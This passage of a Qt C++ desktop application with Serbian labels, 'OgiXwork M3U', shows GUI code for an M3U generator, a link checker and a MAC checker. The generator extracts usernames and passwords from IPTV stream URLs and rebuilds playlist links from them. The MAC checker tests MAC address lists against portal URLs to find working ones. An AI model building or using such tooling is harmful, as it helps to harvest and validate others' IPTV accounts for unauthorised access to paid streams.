            dbg("STREAM", "❌ Nije playable — link_fault ali expiry prošao: " + expireDate);
        }

        if (streamLinkFaultCount == maxToTest) {
            dbg("STREAM", "❌ Nije playable — svi create_link: link_fault (stream nedostupan)");
        }
        dbg("STREAM", QString("❌ Nije playable. fail=%1 tested=%2")
            .arg(streamFailCount).arg(maxToTest));
        return false;
    } // kraj checkMacPlayable

}; // kraj MacWorker klase

// ═══════════════════════════════════════════════════════════════════
// OgiXApp — GLAVNI PROZOR
// ═══════════════════════════════════════════════════════════════════

class OgiXApp : public QWidget {
    Q_OBJECT
public:
    explicit OgiXApp(QWidget *parent = nullptr);
    ~OgiXApp();
private slots:
    void processGenerator();
    QList<QString> extractUrlsFromText(const QString &text);
    bool isValidM3uUrl(const QString &url);
    void loadCheckFile();
    void runCheck();
    void stopCheck();
    void runPlayableCheck();
    void runVpnRetry();
    void updateVpnCountry(const QString &country);
    void saveResults();
    void updateProgress(int current, int total, double speed);
    void updatePhase(const QString &text);
    void handleResult(const CheckResult &result);
    void finalizeCheck(bool wasStopped);
private:
    QWidget* createGeneratorTab();
    QWidget* createCheckerTab();
    QWidget* createMacTab();
    QWidget* createSidePanel();
    void cleanupWorker();
    void clearAllResultTabs();
    void applyColorCoding(QTextEdit *edit, const CheckResult &result);

    // Generator
    QTextEdit *genInput, *genStdResult, *genSpecResult;
    QCheckBox *genSortCheck;
    // Checker
    FastPasteTextEdit *checkerInput;
    QProgressBar *progressBar;
    QLabel *progressLabel, *speedLabel, *phaseLabel;
    BadgeButton *checkButton, *stopButton, *playableButton, *saveButton, *vpnButton, *loadButton;
    QCheckBox *phase2Check, *blockedCheck;
    QTabWidget *resultNotebook;
    QTextEdit *singleTab, *multiTab, *blockedTab;
    QTextEdit *playSingleTab, *playMultiTab;
    QTextEdit *vpnSingleTab, *vpnMultiTab;
    QLabel *singleCountLabel, *multiCountLabel, *vpnCountLabel;
    QString currentVpnCountry;
    Worker *currentWorker;
    QThread *workerThread;
    int singleCount, multiCount, blockedCount, vpnSingleCount, vpnMultiCount;
    bool isChecking, m_stopRequested;
    QList<QString> blockedLinksList;

    // MAC Checker
    QTextEdit    *macPortalInput;
    QTextEdit    *macInput;
    QTextEdit    *macResultTab;
    QTabWidget   *macResultNotebook;
    QProgressBar *macProgressBar;
    QLabel       *macProgressLabel, *macSpeedLabel, *macPhaseLabel;
    BadgeButton  *macCheckButton, *macStopButton, *macExtractButton, *macClearButton;
    QLabel       *macCountLabel;
    int           macCount;
    bool          isMacChecking;
    bool          m_hadPortalBans;
    MacWorker    *currentMacWorker;
    QThread      *macWorkerThread;
    QMap<QString, QStringList> m_macResults;

    enum class CheckMode { Normal, Playable, Vpn };
    CheckMode currentCheckMode;
};

OgiXApp::OgiXApp(QWidget *parent) : QWidget(parent), currentCheckMode(CheckMode::Normal) {
    setWindowTitle("OgiXwork M3U");
    QIcon appIcon;
    QStringList iconPaths = {"OgiXwork_M3U.ico","./OgiXwork_M3U.ico","../OgiXwork_M3U.ico","../../OgiXwork_M3U.ico"};
    for (const QString &path : iconPaths) {
        if (QFile::exists(path)) { appIcon = QIcon(path); if (!appIcon.isNull()) break; }
    }
    if (!appIcon.isNull()) setWindowIcon(appIcon);
    resize(1400, 900);
    QString darkStylesheet =
        "QWidget { background-color: #2a2a3e; color: #ffffff; } "
        "QTextEdit { background-color: #1f1f2e; color: #00ff00; border: 1px solid #3a3a4e; border-radius: 6px; padding: 8px; font-family: 'Consolas'; font-size: 10pt; } "
        "QCheckBox { color: #ffffff; spacing: 8px; font-size: 10pt; } "
        "QCheckBox::indicator { width: 20px; height: 20px; border: 1px solid #666666; border-radius: 3px; background-color: #000000; } "
        "QCheckBox::indicator:checked { background-color: #000000; border: 1px solid #ffffff; } "
        "QLabel { color: #ffffff; } "
        "QProgressBar { background-color: #3a3a4e; border-radius: 6px; border: 1px solid #4a4a5e; height: 20px; } "
        "QProgressBar::chunk { background: qlineargradient(x1:0,y1:0,x2:0,y2:1,stop:0 #00ff00,stop:1 #00aa00); border-radius: 5px; } "
        "QTabWidget::pane { border: 1px solid #3a3a4e; background-color: #2a2a3e; } "
        "QTabBar::tab { background-color: #3a3a4e; color: #aaaaaa; padding: 10px 20px; border: 1px solid #4a4a5e; margin-right: 2px; } "
        "QTabBar::tab:selected { background-color: #0066ff; color: #ffffff; font-weight: bold; } "
        "QGroupBox { color: #ffffff; border: 1px solid #3a3a4e; border-radius: 8px; padding-top: 10px; margin-top: 10px; font-weight: bold; } "
        "QGroupBox::title { subcontrol-origin: margin; subcontrol-position: top left; padding: 0 6px; } "
        "QScrollBar:vertical { background: #2a2a3e; width: 8px; border-radius: 4px; } "
        "QScrollBar::handle:vertical { background: rgba(255,255,255,0.2); border-radius: 4px; min-height: 20px; } "
        "QScrollBar::handle:vertical:hover { background: rgba(255,255,255,0.35); } "
        "QScrollBar::add-line:vertical, QScrollBar::sub-line:vertical { height: 0px; } ";
    setStyleSheet(darkStylesheet);
    QVBoxLayout *mainLayout = new QVBoxLayout(this);
    QTabWidget *notebook = new QTabWidget(this);
    notebook->addTab(createGeneratorTab(), "M3U Generator");
    notebook->addTab(createCheckerTab(),   "M3U Checker");
    notebook->addTab(createMacTab(),       "MAC Checker");
    mainLayout->addWidget(notebook);

    currentWorker = nullptr; workerThread = nullptr;
    singleCount = multiCount = blockedCount = vpnSingleCount = vpnMultiCount = 0;
    currentVpnCountry = ""; isChecking = false; m_stopRequested = false;
    singleTab = multiTab = blockedTab = nullptr;
    playSingleTab = playMultiTab = nullptr;
    vpnSingleTab  = vpnMultiTab  = nullptr;

    currentMacWorker = nullptr; macWorkerThread = nullptr;
    macCount = 0; isMacChecking = false; m_hadPortalBans = false;
}

OgiXApp::~OgiXApp() { cleanupWorker(); }

QWidget* OgiXApp::createSidePanel() {
    QWidget *panel = new QWidget();
    panel->setMaximumWidth(380);
    panel->setStyleSheet("QWidget { background-color: #2a2a3e; }");
    QVBoxLayout *layout = new QVBoxLayout(panel);
    layout->setContentsMargins(10, 15, 2, 10);
    layout->setSpacing(8);
    loadButton    = new BadgeButton("📁", "Učitaj Tekst",    "#0066ff", "#003399");
    checkButton   = new BadgeButton("▶",  "Proveri Liste",   "#00cc00", "#008800");
    stopButton    = new BadgeButton("⏹", "Stop",             "#ff3333", "#aa0000");
    playableButton= new BadgeButton("✓",  "Proveri Playable","#0099ff", "#003399");
    vpnButton     = new BadgeButton("🌍", "VPN Provera",     "#ff8c00", "#cc6600");
    saveButton    = new BadgeButton("💾", "Sačuvaj",          "#9933ff", "#663399");
    stopButton->setEnabled(false);
    connect(loadButton,     &BadgeButton::clicked, this, &OgiXApp::loadCheckFile);
    connect(checkButton,    &BadgeButton::clicked, this, &OgiXApp::runCheck);
    connect(stopButton,     &BadgeButton::clicked, this, &OgiXApp::stopCheck);
    connect(playableButton, &BadgeButton::clicked, this, &OgiXApp::runPlayableCheck);
    connect(vpnButton,      &BadgeButton::clicked, this, &OgiXApp::runVpnRetry);
    connect(saveButton,     &BadgeButton::clicked, this, &OgiXApp::saveResults);
    layout->addWidget(loadButton); layout->addWidget(checkButton); layout->addWidget(stopButton);
    layout->addWidget(playableButton); layout->addWidget(vpnButton); layout->addWidget(saveButton);
    layout->addSpacing(20);
    QLabel *statsLabel = new QLabel("STATS");
    statsLabel->setFont(QFont("Arial", 11, QFont::Bold));
    statsLabel->setStyleSheet("color: #0099ff;");
    statsLabel->setAlignment(Qt::AlignCenter);
    layout->addWidget(statsLabel);
    singleCountLabel = new QLabel("✓ Single: 0");
    singleCountLabel->setStyleSheet("color: #00ff00; font-weight: bold; font-size: 10pt;");
    multiCountLabel  = new QLabel("✓ Multi: 0");
    multiCountLabel->setStyleSheet("color: #00ff00; font-weight: bold; font-size: 10pt;");
    vpnCountLabel    = new QLabel("🌍 VPN: --");
    vpnCountLabel->setStyleSheet("color: #ff8c00; font-weight: bold; font-size: 10pt;");
    layout->addWidget(singleCountLabel); layout->addWidget(multiCountLabel); layout->addWidget(vpnCountLabel);
    layout->addStretch();
    return panel;
}

void OgiXApp::cleanupWorker() {
    if (currentWorker) {
        m_stopRequested = true; currentWorker->requestStop();
        disconnect(currentWorker, nullptr, this, nullptr);
        if (workerThread && workerThread->isRunning()) {
            workerThread->quit();
            if (!workerThread->wait(2000)) { workerThread->terminate(); workerThread->wait(500); }
        }
        currentWorker->deleteLater(); currentWorker = nullptr;
        if (workerThread) { workerThread->deleteLater(); workerThread = nullptr; }
        qApp->processEvents(QEventLoop::AllEvents, 100);
    }
    isChecking = false; m_stopRequested = false;
}

void OgiXApp::clearAllResultTabs() {
    while (resultNotebook->count() > 0) { QWidget *w = resultNotebook->widget(0); resultNotebook->removeTab(0); delete w; }
    singleTab = multiTab = blockedTab = nullptr;
    playSingleTab = playMultiTab = nullptr;
    vpnSingleTab  = vpnMultiTab  = nullptr;
    singleCount = multiCount = blockedCount = vpnSingleCount = vpnMultiCount = 0;
    if (singleCountLabel) singleCountLabel->setText("✓ Single: 0");
    if (multiCountLabel)  multiCountLabel->setText("✓ Multi: 0");
    if (vpnCountLabel)    vpnCountLabel->setText("🌍 VPN: --");
}

QWidget* OgiXApp::createGeneratorTab() {
    QWidget *tab = new QWidget();
    QVBoxLayout *layout = new QVBoxLayout(tab);
    QLabel *label = new QLabel("Unesi Stream linkove:");
    label->setFont(QFont("Arial", 12, QFont::Bold)); label->setStyleSheet("color: #ffffff;");
    layout->addWidget(label);
    genInput = new QTextEdit(); genInput->setFont(QFont("Consolas", 10));
    genInput->setPlaceholderText("Zalepi linkove ovde...");
    genInput->setStyleSheet("QTextEdit { background-color: #1f1f2e; color: #ffffff; border: 1px solid #3a3a4e; border-radius: 6px; padding: 8px; }");
    QPalette palette = genInput->palette(); palette.setColor(QPalette::PlaceholderText, QColor(255,255,255));
    genInput->setPalette(palette); layout->addWidget(genInput);
    QHBoxLayout *btnLayout = new QHBoxLayout();
    QPushButton *genBtn = new QPushButton("Kreiraj M3U");
    genBtn->setFont(QFont("Arial", 11, QFont::Bold));
    genBtn->setStyleSheet("background: qlineargradient(x1:0,y1:0,x2:0,y2:1,stop:0 #00cc00,stop:1 #008800); border: 1px solid #006600;");
    connect(genBtn, &QPushButton::clicked, this, &OgiXApp::processGenerator);
    btnLayout->addWidget(genBtn);
    genSortCheck = new CustomCheckBox("Sortiraj M3U iz txt-a");
    btnLayout->addWidget(genSortCheck); layout->addLayout(btnLayout);
    QTabWidget *genNotebook = new QTabWidget();
    genStdResult  = new QTextEdit(); genStdResult->setFont(QFont("Consolas", 10)); genStdResult->setReadOnly(true);
    genSpecResult = new QTextEdit(); genSpecResult->setFont(QFont("Consolas", 10)); genSpecResult->setReadOnly(true);
    genNotebook->addTab(genStdResult, "Standardne Liste"); genNotebook->addTab(genSpecResult, "Specijalne Liste");
    layout->addWidget(genNotebook);
    return tab;
}

QWidget* OgiXApp::createCheckerTab() {
    QWidget *tab = new QWidget();
    QHBoxLayout *tabLayout = new QHBoxLayout(tab);
    QVBoxLayout *leftLayout = new QVBoxLayout();
    phase2Check = new CustomCheckBox("Faza 2 provera"); phase2Check->setChecked(false);
    leftLayout->addWidget(phase2Check);
    blockedCheck = new CustomCheckBox("Blokirane IP"); leftLayout->addWidget(blockedCheck);
    QGroupBox *inputGroup = new QGroupBox("Linkovi za proveru");
    QVBoxLayout *inputLayout = new QVBoxLayout(inputGroup);
    checkerInput = new FastPasteTextEdit(); checkerInput->setFont(QFont("Consolas", 10)); checkerInput->setMaximumHeight(120);
    QPalette p2 = checkerInput->palette(); p2.setColor(QPalette::PlaceholderText, Qt::white); checkerInput->setPalette(p2);
    inputLayout->addWidget(checkerInput);
    progressBar = new QProgressBar(); inputLayout->addWidget(progressBar);
    phaseLabel = new QLabel("Spreman..."); phaseLabel->setStyleSheet("color: #ffffff;");
    progressLabel = new QLabel(""); speedLabel = new QLabel("");
    inputLayout->addWidget(phaseLabel); inputLayout->addWidget(progressLabel); inputLayout->addWidget(speedLabel);
    leftLayout->addWidget(inputGroup);
    resultNotebook = new QTabWidget(); leftLayout->addWidget(resultNotebook);
    QWidget *leftWidget = new QWidget(); leftWidget->setLayout(leftLayout);
    tabLayout->addWidget(leftWidget, 1); tabLayout->addWidget(createSidePanel(), 0);
    return tab;
}

QWidget* OgiXApp::createMacTab() {
    QWidget *tab = new QWidget();
    QHBoxLayout *tabLayout = new QHBoxLayout(tab);

    QVBoxLayout *leftLayout = new QVBoxLayout();

    QGroupBox *portalGroup = new QGroupBox("Portal URL-ovi");
    QVBoxLayout *portalLayout = new QVBoxLayout(portalGroup);
    macPortalInput = new QTextEdit();
    macPortalInput->setFont(QFont("Consolas", 10));
    macPortalInput->setMaximumHeight(100);
    macPortalInput->setPlaceholderText("http://portal.example.com:8080/c/\nhttp://tv.example.xyz:8080/c/");
    QPalette p1 = macPortalInput->palette();
    p1.setColor(QPalette::PlaceholderText, Qt::white);
    macPortalInput->setPalette(p1);
    portalLayout->addWidget(macPortalInput);
    leftLayout->addWidget(portalGroup);

    QGroupBox *macGroup = new QGroupBox("MAC Adrese");
    QVBoxLayout *macLayout = new QVBoxLayout(macGroup);
    macInput = new QTextEdit();;
    macInput->setFont(QFont("Consolas", 10));
    macInput->setMaximumHeight(120);
    macInput->setPlaceholderText("00:1A:79:BB:CD:93\n00:1A:79:70:0F:06\n00:1A:79:6B:2F:C4");
    QPalette p2 = macInput->palette();
    p2.setColor(QPalette::PlaceholderText, Qt::white);
    macInput->setPalette(p2);
    macLayout->addWidget(macInput);
    leftLayout->addWidget(macGroup);

    macProgressBar   = new QProgressBar();
    macPhaseLabel    = new QLabel("Spreman...");
    macPhaseLabel->setStyleSheet("color: #ffffff;");
    macProgressLabel = new QLabel("");
    macSpeedLabel    = new QLabel("");
    leftLayout->addWidget(macProgressBar);
    leftLayout->addWidget(macPhaseLabel);
    leftLayout->addWidget(macProgressLabel);
    leftLayout->addWidget(macSpeedLabel);

    macResultNotebook = new QTabWidget();
    macResultTab = new QTextEdit();
    macResultTab->setReadOnly(true);
    macResultTab->setFont(QFont("Consolas", 10));
    macResultNotebook->addTab(macResultTab, "✔ Playable MAC (0)");
    leftLayout->addWidget(macResultNotebook);

    QWidget *leftWidget = new QWidget();
    leftWidget->setLayout(leftLayout);
    tabLayout->addWidget(leftWidget, 1);

    // Desni panel
    QWidget *panel = new QWidget();
    panel->setMaximumWidth(380);
    panel->setStyleSheet("QWidget { background-color: #2a2a3e; }");
    QVBoxLayout *panelLayout = new QVBoxLayout(panel);
    panelLayout->setContentsMargins(10, 15, 2, 10);
    panelLayout->setSpacing(8);

    macCheckButton = new BadgeButton("✓",  "Proveri Playable MAC", "#0099ff", "#003399");
    macStopButton  = new BadgeButton("⏹", "Stop",                  "#ff3333", "#aa0000");
    macStopButton->setEnabled(false);
    macExtractButton = new BadgeButton("→", "Izdvoji MAC iz Txt-a", "#555555", "#333333");
    macExtractButton->setEnabled(true);

    connect(macExtractButton, &BadgeButton::clicked, this, [this]() {
        QString rawText = macPortalInput->toPlainText();
        if (rawText.trimmed().isEmpty()) {
            QMessageBox::warning(this, "Prazno", "Ubaci tekst u prozor Portal URL-ovi.");
            return;
        }
        QRegularExpression reMac(R"([0-9A-Fa-f]{2}[:\-][0-9A-Fa-f]{2}[:\-][0-9A-Fa-f]{2}[:\-][0-9A-Fa-f]{2}[:\-][0-9A-Fa-f]{2}[:\-][0-9A-Fa-f]{2})");
        QStringList found;
        QSet<QString> seen;
        auto it = reMac.globalMatch(rawText);
        while (it.hasNext()) {
            QString mac = it.next().captured(0).toUpper();
            mac.replace("-", ":");
            if (!seen.contains(mac)) {
                seen.insert(mac);
                found.append(mac);
            }
        }
        if (found.isEmpty()) {
            QMessageBox::warning(this, "Izdvajanje MAC", "Nisu pronađene MAC adrese u tekstu.");
            return;
        }
        macInput->setPlainText(found.join("\n"));
        QMessageBox::information(this, "Izdvajanje MAC",
            QString("Izdvojeno %1 MAC adresa.").arg(found.size()));
    });

    connect(macCheckButton, &BadgeButton::clicked, this, [this]() {
    if (isMacChecking) return;

    QString rawPortals = macPortalInput->toPlainText().trimmed();
    QString rawMacs    = macInput->toPlainText().trimmed();

    if (rawPortals.isEmpty()) { QMessageBox::warning(this, "Prazno", "Ubaci portal URL-ove."); return; }
    if (rawMacs.isEmpty())    { QMessageBox::warning(this, "Prazno", "Ubaci MAC adrese."); return; }

    QList<QString> portals, macs;
    for (const QString &l : rawPortals.split('\n', Qt::SkipEmptyParts)) {
        QString t = l.trimmed();
        if (!t.isEmpty() && t.contains("://")) portals.append(t);
    }
    for (const QString &l : rawMacs.split('\n', Qt::SkipEmptyParts)) {
        QString t = l.trimmed();
        if (!t.isEmpty()) macs.append(t);
    }

    if (portals.isEmpty()) { QMessageBox::warning(this, "Greška", "Nema validnih portal URL-ova."); return; }
    if (macs.isEmpty())    { QMessageBox::warning(this, "Greška", "Nema validnih MAC adresa."); return; }

    // Cleanup prethodnog workera ako postoji
    if (currentMacWorker) {
        currentMacWorker->requestStop();
        if (macWorkerThread) {
            macWorkerThread->quit();
            macWorkerThread->wait(2000);
        }
        currentMacWorker->deleteLater(); currentMacWorker = nullptr;
        macWorkerThread->deleteLater();  macWorkerThread  = nullptr;
    }

    macCount = 0;
    macResultTab->clear();
    m_macResults.clear();
    macResultNotebook->setTabText(0, "✔ Playable MAC (0)");
    m_hadPortalBans = false;
    macProgressBar->setValue(0);
    macProgressBar->setMaximum(100);
    macProgressBar->setValue(0);
    macPhaseLabel->setText("Pokretanje...");
    macPhaseLabel->setStyleSheet("color: #0099ff;");
    isMacChecking = true;
    macCheckButton->setEnabled(false);
    macStopButton->setEnabled(true);

    currentMacWorker = new MacWorker();
    macWorkerThread  = new QThread();
    currentMacWorker->moveToThread(macWorkerThread);
    disconnect(currentMacWorker, nullptr, this, nullptr);

    // ✅ FIX #1: currentMacWorker kao context — lambda se izvršava u worker threadu
    MacWorker       *workerPtr  = currentMacWorker;
    QList<QString>   portalsCopy = portals;
    QList<QString>   macsCopy    = macs;
    connect(macWorkerThread, &QThread::started, currentMacWorker,
        [workerPtr, portalsCopy, macsCopy]() {
            workerPtr->runMacCheck(portalsCopy, macsCopy);
        }
    );

connect(currentMacWorker, &MacWorker::progressUpdated, this,
        [this](int c, int t, double spd) {
            macProgressBar->setMaximum(t);
            macProgressBar->setValue(c);
            macProgressLabel->setText(QString("%1 / %2").arg(c).arg(t));
            if (spd > 0) macSpeedLabel->setText(QString("%1 l/s").arg(spd, 0, 'f', 1));
        }, Qt::QueuedConnection);

    connect(currentMacWorker, &MacWorker::phaseChanged, this,
        [this](const QString &txt) {
            macPhaseLabel->setText(txt);
            macPhaseLabel->setStyleSheet("color: #0099ff;");
        }, Qt::QueuedConnection);

connect(currentMacWorker, &MacWorker::resultFound, this,
        [this](const CheckResultMac &res) {
            if (!macResultTab) return;

            // Dodaj MAC u mapu po portalu
            m_macResults[res.portal].append(res.mac);

            // Prebrojaj sve
            macCount = 0;
            for (auto &v : m_macResults) macCount += v.size();

            // Izgradi ceo prikaz grupisan po portalu
            QString display;
            for (auto it = m_macResults.begin(); it != m_macResults.end(); ++it) {
                display += "Portal: " + it.key() + "\n";
                display += "Playable mac:\n";
                for (const QString &mac : it.value())
                    display += mac + "\n";
                display += "\n";
            }

            macResultTab->setPlainText(display);
            macResultTab->moveCursor(QTextCursor::End);

            macResultNotebook->setTabText(0,
                QString("✔ Playable MAC (%1)").arg(macCount));
            if (macCountLabel)
                macCountLabel->setText(QString("MAC: %1").arg(macCount));
        }, Qt::QueuedConnection);
connect(currentMacWorker, &MacWorker::checkFinished, this,
        [this](bool wasStopped) {
            isMacChecking = false;
            macStopButton->setEnabled(false);
            macCheckButton->setEnabled(true);

            if (wasStopped) {
                macPhaseLabel->setText("Zaustavljeno.");
                macPhaseLabel->setStyleSheet("color: #ff8c00;");
            } else {
                macPhaseLabel->setText("Skeniranje završeno!");
                macPhaseLabel->setStyleSheet("color: #00ff00;");
                if (!m_hadPortalBans) {
                    int finalCount = macCount;
                    QTimer::singleShot(200, this, [this, finalCount]() {
                        QMessageBox::information(this,
                            "Skeniranje Završeno",
                            QString("Nađeno %1 Playable MAC-a.").arg(finalCount));
                    });
                }
            }
            // ✅ DODAJ OVO — bez ovoga thread nikad ne umire:
            if (macWorkerThread) macWorkerThread->quit();
        }, Qt::QueuedConnection);

connect(macWorkerThread, &QThread::finished, this, [this]() {
        if (currentMacWorker) { currentMacWorker->deleteLater(); currentMacWorker = nullptr; }
        if (macWorkerThread)  { macWorkerThread->deleteLater();  macWorkerThread  = nullptr; }
    }, Qt::QueuedConnection);

connect(currentMacWorker, &MacWorker::portalProbeReport, this,
        [this](const QString &reportText) {
            if (reportText.trimmed().isEmpty()) return;
            m_hadPortalBans = true;

            QDialog *dlg = new QDialog(this);
            dlg->setWindowTitle("❌ Nedostupni Portali");
            dlg->setAttribute(Qt::WA_DeleteOnClose);
            dlg->setFixedWidth(520);
            dlg->setStyleSheet("QDialog { background-color: #0d0d1a; }"
                               "QPushButton { background-color: #aa0000; color: white; "
                               "border-radius: 6px; padding: 6px 24px; font-weight: bold; }"
                               "QPushButton:hover { background-color: #cc0000; }");

            QVBoxLayout *layout = new QVBoxLayout(dlg);
            layout->setContentsMargins(16, 16, 16, 12);
            layout->setSpacing(10);

            QLabel *txt = new QLabel(reportText);
            txt->setFont(QFont("Consolas", 10));
            txt->setStyleSheet("QLabel { color: #ff4444; padding: 4px; }");
            txt->setWordWrap(false);
            txt->setSizePolicy(QSizePolicy::Expanding, QSizePolicy::Minimum);
            txt->setTextInteractionFlags(Qt::TextSelectableByMouse);
            txt->setMinimumWidth(0);
            layout->addWidget(txt);

            // Prilagodi širinu dijaloga tekstu
            dlg->adjustSize();
            int neededW = txt->sizeHint().width() + 48;
            if (neededW > 300) dlg->setFixedWidth(neededW);

            QPushButton *okBtn = new QPushButton("OK");
            okBtn->setFixedWidth(100);
            connect(okBtn, &QPushButton::clicked, dlg, &QDialog::accept);
            QHBoxLayout *btnRow = new QHBoxLayout();
            btnRow->addStretch();
            btnRow->addWidget(okBtn);
            btnRow->addStretch();
            layout->addLayout(btnRow);

            // Centriraj prozor na roditelju
            if (parentWidget()) {
                QPoint center = parentWidget()->geometry().center();
                dlg->move(center.x() - dlg->width() / 2,
                          center.y() - dlg->height() / 2);
            }

            dlg->show();
        }, Qt::QueuedConnection);

    macWorkerThread->start();
});

// ✅ FIX #3: Stop dugme čisti thread
connect(macStopButton, &BadgeButton::clicked, this, [this]() {
    if (!isMacChecking) return;
    isMacChecking = false;
    macStopButton->setEnabled(false);
    macCheckButton->setEnabled(true);
    macPhaseLabel->setText("Zaustavljanje...");
    macPhaseLabel->setStyleSheet("color: #ff8c00;");

    if (currentMacWorker) {
        currentMacWorker->requestStop();
        // Ostatak čišćenja se dešava u checkFinished slotu
    }
});
panelLayout->addWidget(macCheckButton);
    panelLayout->addWidget(macStopButton);
    panelLayout->addSpacing(10);
    panelLayout->addWidget(macExtractButton);

    macClearButton = new BadgeButton("🗑", "Očisti sve", "#444444", "#222222");
    panelLayout->addWidget(macClearButton);
    connect(macClearButton, &BadgeButton::clicked, this, [this]() {
    if (isMacChecking) return;

    // Čisti input prozore
    macPortalInput->clear();
    macInput->clear();

    // Čisti rezultate
    macResultTab->clear();
    m_macResults.clear();
    macCount = 0;
    macResultNotebook->setTabText(0, "✔ Playable MAC (0)");
if (macCountLabel) macCountLabel->setText("MAC: 0");

    // FIX: setMaximum(0) uzrokuje animirani "šetač" — mora biti 100
    macProgressBar->setMaximum(100);
    macProgressBar->setValue(0);

    macProgressLabel->setText("");
    macSpeedLabel->setText("");
    macPhaseLabel->setText("Spreman...");
    macPhaseLabel->setStyleSheet("color: #ffffff;");
});
    panelLayout->addSpacing(20);

    QLabel *statsLabel = new QLabel("STATS");
    statsLabel->setFont(QFont("Arial", 11, QFont::Bold));
    statsLabel->setStyleSheet("color: #0099ff;");
    statsLabel->setAlignment(Qt::AlignCenter);
    panelLayout->addWidget(statsLabel);

    macCountLabel = new QLabel("MAC: 0");
    macCountLabel->setStyleSheet("color: #00ff00; font-weight: bold; font-size: 10pt;");
    panelLayout->addWidget(macCountLabel);
    panelLayout->addStretch();

    tabLayout->addWidget(panel, 0);
    return tab;
}

void OgiXApp::processGenerator() {
    QString raw = genInput->toPlainText().trimmed();
    if (raw.isEmpty()) { QMessageBox::warning(this, "Greška", "Nema podataka."); return; }
    genStdResult->clear(); genSpecResult->clear();
    if (genSortCheck->isChecked()) {
        QList<QString> extracted = extractUrlsFromText(raw);
        if (extracted.isEmpty()) { QMessageBox::information(this, "Sortiraj M3U", "Nisu pronađeni URL-ovi."); return; }
        genStdResult->append(extracted.join("\n"));
        QMessageBox::information(this, "Gotovo", QString("Izvučeno %1 URL-ova.").arg(extracted.size()));
        return;
    }
    QStringList lines = raw.split('\n', Qt::SkipEmptyParts);
    QSet<QString> standardSeen, specialSeen; bool hasSpecial = false;
    for (const QString &line : lines) {
        QString trimmed = line.trimmed();
        if (trimmed.isEmpty() || (trimmed.contains("/play/") && trimmed.endsWith("/ts")) || trimmed.contains("/hls/stream.m3u8")) continue;
        QUrl url(trimmed); if (!url.isValid()) continue;
        if (url.host().contains("mini.i3ns.net", Qt::CaseInsensitive)) continue;
        QUrlQuery query(url.query());
        if (query.hasQueryItem("channelId") && query.hasQueryItem("deviceUser") && query.hasQueryItem("devicePass")) {
            QString du = query.queryItemValue("deviceUser"), dp = query.queryItemValue("devicePass");
            QString baseUrl = url.scheme() + "://" + url.authority();
            QString newLink = QString("%1/playlist?type=m3u&deviceUser=%2&devicePass=%3").arg(baseUrl, du, dp);
            if (!specialSeen.contains(newLink)) { specialSeen.insert(newLink); genSpecResult->append(newLink); hasSpecial = true; }
            continue;
        }
        QString path = url.path(); if (path.startsWith('/')) path = path.mid(1);
        QStringList parts = path.split('/'); QString username, password;
        if (parts.size() >= 4 && (parts[0]=="play"||parts[0]=="live")) { username=parts[1]; password=parts[2]; }
        else if (parts.size() >= 3) { username=parts[0]; password=parts[1]; }
        if (!username.isEmpty() && !password.isEmpty()) {
            QString baseUrl = url.scheme() + "://" + url.authority();
            QString newLink = QString("%1/get.php?username=%2&password=%3&type=m3u_plus").arg(baseUrl, username, password);
            if (!standardSeen.contains(newLink)) { standardSeen.insert(newLink); genStdResult->append(newLink); }
        }
    }
    QMessageBox::information(this, "Gotovo", hasSpecial ? "Generisanje završeno!" : QString("Generisano %1 linkova.").arg(standardSeen.size()));
}

QList<QString> OgiXApp::extractUrlsFromText(const QString &text) {
    QList<QString> found; QSet<QString> seen;
    QRegularExpression reUrl(R"(https?://\S+)");
    QRegularExpression reNamed(R"(^(?:Playlist|URL|url)\s*:\s*(https?://\S+))", QRegularExpression::CaseInsensitiveOption);
    for (const QString &line : text.split('\n')) {
        QString s = line.trimmed(); if (s.isEmpty()) continue;
        QRegularExpressionMatch matchNamed = reNamed.match(s);
        if (matchNamed.hasMatch()) {
            QString url = matchNamed.captured(1).trimmed().remove(QRegularExpression("[.,;)]+$"));
            if (!seen.contains(url) && isValidM3uUrl(url)) { seen.insert(url); found.append(url); }
            continue;
        }
        if (s.startsWith("http://") || s.startsWith("https://")) {
            QString url = s.split(' ').first().trimmed().remove(QRegularExpression("[.,;)]+$"));
            if (!seen.contains(url) && isValidM3uUrl(url)) { seen.insert(url); found.append(url); }
            continue;
        }
        auto it = reUrl.globalMatch(s);
        while (it.hasNext()) {
            QRegularExpressionMatch match = it.next();
            QString url = match.captured(0).trimmed().remove(QRegularExpression("[.,;)]+$"));
            if (!seen.contains(url) && isValidM3uUrl(url)) { seen.insert(url); found.append(url); }
        }
    }
    return found;
}

bool OgiXApp::isValidM3uUrl(const QString &url) {
    QString lower = url.toLower();
    return lower.contains("username=") || lower.contains("password=") ||
           lower.contains("/get.php")  || lower.contains("/live/");
}

void OgiXApp::loadCheckFile() {
    QString fileName = QFileDialog::getOpenFileName(this, "Učitaj TXT fajl", "", "Text files (*.txt);;All files (*)");
    if (!fileName.isEmpty()) {
        QFile file(fileName);
        if (file.open(QIODevice::ReadOnly | QIODevice::Text)) {
            QTextStream in(&file); checkerInput->setPlainText(in.readAll());
            QMessageBox::information(this, "Učitano", "Fajl uspešno učitan.");
        }
    }
}

void OgiXApp::runCheck() {
    if (isChecking) return;
    cleanupWorker();
    QTimer::singleShot(100, this, [this]() {
        QString raw = checkerInput->toPlainText().trimmed();
        if (raw.isEmpty()) { QMessageBox::warning(this, "Prazno", "Nema linkova."); return; }
        QStringList lines = raw.split('\n', Qt::SkipEmptyParts);
        QList<QString> validLinks;
        for (const QString &line : lines) if (line.contains("://")) validLinks.append(line.trimmed());
        if (validLinks.isEmpty()) { QMessageBox::warning(this, "Greška", "Nema validnih linkova."); return; }
        clearAllResultTabs(); currentCheckMode = CheckMode::Normal;
        progressBar->setValue(0); progressBar->setMaximum(validLinks.size());
        phaseLabel->setText("Faza 1: Brza provera...");
        isChecking = true; m_stopRequested = false;
        checkButton->setEnabled(false); stopButton->setEnabled(true);
        currentWorker = new Worker(); workerThread = new QThread();
        currentWorker->moveToThread(workerThread);
        connect(workerThread, &QThread::started, [=]() { currentWorker->runCheck(validLinks, phase2Check->isChecked(), blockedCheck->isChecked()); });
        connect(currentWorker, &Worker::progressUpdated, this, &OgiXApp::updateProgress, Qt::QueuedConnection);
        connect(currentWorker, &Worker::resultFound,     this, &OgiXApp::handleResult,   Qt::QueuedConnection);
        connect(currentWorker, &Worker::phaseChanged,    this, &OgiXApp::updatePhase,    Qt::QueuedConnection);
        connect(currentWorker, &Worker::checkFinished,   this, &OgiXApp::finalizeCheck,  Qt::QueuedConnection);
        connect(workerThread, &QThread::finished, currentWorker, &QObject::deleteLater);
